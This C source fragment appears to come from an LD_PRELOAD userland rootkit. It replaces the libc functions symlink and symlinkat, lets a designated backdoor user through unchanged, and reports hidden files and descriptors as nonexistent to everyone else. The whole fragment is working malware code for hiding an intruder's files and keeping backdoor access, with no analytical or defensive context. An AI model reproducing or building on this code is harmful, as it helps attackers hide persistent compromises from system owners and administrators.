int symlink(const char *target, const char *linkpath)
{
    hook(CSYMLINK);
    if(is_bdusr()) return (long)call(CSYMLINK, target, linkpath);
    if(hidden_path(target) || hidden_path(linkpath)) { errno=ENOENT; return -1; }
    return (long)call(CSYMLINK, target, linkpath);
}

int symlinkat(const char *target, int newdirfd, const char *linkpath)
{
    hook(CSYMLINKAT);
    if(is_bdusr()) return (long)call(CSYMLINKAT, target, newdirfd, linkpath);
    if(hidden_path(target) || hidden_fd(newdirfd) || hidden_path(linkpath)) { errno=ENOENT; return -1; }
    return (long)call(CSYMLINKAT, target, newdirfd, linkpath);
}
